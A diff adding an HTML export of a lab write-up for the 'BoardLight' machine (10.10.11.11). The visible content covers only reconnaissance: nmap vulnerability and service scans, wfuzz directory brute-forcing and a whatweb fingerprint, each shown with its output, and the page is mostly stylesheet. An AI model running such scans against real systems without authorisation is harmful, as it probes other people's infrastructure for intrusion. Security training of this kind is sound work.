@@ -1,0 +1,955 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>BoardLight - 10.10.11.11</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-transparentGray { background-color: rgba(227, 226, 224, 0); }
+.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="cc50f0f1-6c08-4417-8e23-fbc9f398c112" class="page sans"><header><h1 class="page-title">BoardLight - 10.10.11.11</h1><p class="page-description"></p></header><div class="page-body"><h1 id="792f7caf-f451-4d40-ab3f-c497bd1261ce" class="">Information Gathering &amp; Enumeration</h1><h2 id="a159f7be-21af-4d8d-8116-52edc46e820d" class="">NMAP</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2f059a8c-41d3-425b-952b-3d08e52c5591" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~]
+└─$ nmap --script vuln 10.10.11.11
+Starting Nmap 7.92 ( https://nmap.org ) at 2024-06-02 21:51 -05
+Nmap scan report for 10.10.11.11
+Host is up (0.11s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.
+| http-fileupload-exploiter: 
+|   
+|     Couldn&#x27;t find a file-type field.
+|   
+|     Couldn&#x27;t find a file-type field.
+|   
+|     Couldn&#x27;t find a file-type field.
+|   
+|_    Couldn&#x27;t find a file-type field.
+|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.
+| http-csrf: 
+| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.11.11
+|   Found the following possible CSRF vulnerabilities: 
+|     
+|     Path: http://10.10.11.11:80/
+|     Form id: 
+|     Form action: 
+|     
+|     Path: http://10.10.11.11:80/
+|     Form id: 
+|     Form action: 
+|     
+|     Path: http://10.10.11.11:80/about.php
+|     Form id: 
+|     Form action: 
+|     
+|     Path: http://10.10.11.11:80/contact.php
+|     Form id: 
+|     Form action: 
+|     
+|     Path: http://10.10.11.11:80/contact.php
+|     Form id: 
+|     Form action: 
+|     
+|     Path: http://10.10.11.11:80/do.php
+|     Form id: 
+|_    Form action: 
+|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
+
+Nmap done: 1 IP address (1 host up) scanned in 54.47 seconds
+</code></pre><p id="3df896c0-45ef-4f8e-8924-4b774373ecf2" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e30bec6d-a95b-4cf1-819a-0fe6b53d9ce3" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~]
+└─$ nmap -sVC -T5 -n 10.10.11.11
+Starting Nmap 7.92 ( https://nmap.org ) at 2024-06-02 21:50 -05
+Nmap scan report for 10.10.11.11
+Host is up (0.11s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
+|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
+|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 17.16 seconds
+</code></pre><p id="6c83e47b-a997-4927-8799-d7e7b2be0298" class="">
+</p><h2 id="c090c217-be70-43c0-9024-1ca791f3022d" class="">Directory Enumeration</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="20ed1a10-3ad7-4a0f-98d7-63455c73960d" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~]
+└─$ wfuzz -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -u http://10.10.11.11/FUZZ -t 50 --hc 404 
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.11.11/FUZZ
+Total requests: 37050
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+000000001:   200        517 L    1053 W     15949 Ch    &quot;index.php&quot;                                         
+000000106:   200        294 L    635 W      9426 Ch     &quot;contact.php&quot;                                       
+000000157:   403        9 L      28 W       276 Ch      &quot;.htaccess&quot;                                         
+000000379:   200        517 L    1053 W     15949 Ch    &quot;.&quot;                                                 
+000000496:   200        280 L    652 W      9098 Ch     &quot;about.php&quot;                                         
+000000537:   403        9 L      28 W       276 Ch      &quot;.html&quot;                                             
+000000806:   403        9 L      28 W       276 Ch      &quot;.php&quot;                                              
+000001330:   200        294 L    633 W      9209 Ch     &quot;do.php&quot;                                            
+000001564:   403        9 L      28 W       276 Ch      &quot;.htpasswd&quot;                                         
+000001830:   403        9 L      28 W       276 Ch      &quot;.htm&quot;                                              
+000002100:   403        9 L      28 W       276 Ch      &quot;.htpasswds&quot;                                        
+000004625:   403        9 L      28 W       276 Ch      &quot;.htgroup&quot;                                          
+000005172:   403        9 L      28 W       276 Ch      &quot;wp-forum.phps&quot;                                     
+000007079:   403        9 L      28 W       276 Ch      &quot;.htaccess.bak&quot;                                     
+000008688:   403        9 L      28 W       276 Ch      &quot;.htuser&quot;                                           
+000011460:   403        9 L      28 W       276 Ch      &quot;.htc&quot;                                              
+000011459:   403        9 L      28 W       276 Ch      &quot;.ht&quot;                                               
+000013534:   403        9 L      28 W       276 Ch      &quot;dispatch.fcgi&quot;                                     
+000014980:   403        9 L      28 W       276 Ch      &quot;mytias.fcgi&quot;                                       
+000016577:   403        9 L      28 W       276 Ch      &quot;test.fcgi&quot;                                         
+000017182:   403        9 L      28 W       276 Ch      &quot;.htacess&quot;                                          
+000017181:   403        9 L      28 W       276 Ch      &quot;.htaccess.old&quot;                                     
+000025586:   403        9 L      28 W       276 Ch      &quot;download.fcgi&quot;                                     
+000031310:   403        9 L      28 W       276 Ch      &quot;php5-wrapper.fcgi&quot;    </code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="dac87252-68d9-40d1-a334-661edb9b9bb0" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~]
+└─$ ┌──(drroot㉿drroot)-[~]
+└─$ wfuzz -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.10.11.11/FUZZ -t 50 --hc 404  
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.11.11/FUZZ
+Total requests: 30000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+000000002:   301        9 L      28 W       311 Ch      &quot;images&quot;                                            
+000000009:   301        9 L      28 W       307 Ch      &quot;js&quot;                                                
+000000015:   301        9 L      28 W       308 Ch      &quot;css&quot;                                               
+000004227:   403        9 L      28 W       276 Ch      &quot;server-status&quot;                                     
+000004255:   200        517 L    1053 W     15949 Ch    &quot;http://10.10.11.11/&quot;                               
+
+Total time: 72.35861
+Processed Requests: 29950
+Filtered Requests: 29945
+Requests/sec.: 413.9106
+ /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:78: UserWarning:Fatal exception: Pycurl error 3: URL rejected: Malformed input to a URL function
+
+</code></pre><p id="ee1a32df-25d6-4433-805b-5dbbe58f0d4a" class="">
+</p><h2 id="b1b820fe-e51e-46f3-bb2c-ac9df49f3c93" class="">Web Tech enumeration</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="73f23b5d-e4cd-432f-b92b-372096e920a1" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~]
+└─$ whatweb &quot;http://10.10.11.11/&quot; -a 3                  
+http://10.10.11.11/ [200 OK] Apache[2.4.41], Bootstrap[4.3.1], Country[RESERVED][ZZ], Email[info@board.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.11], JQuery[3.4.1], Script[text/javascript], X-UA-Compatible[IE=edge]
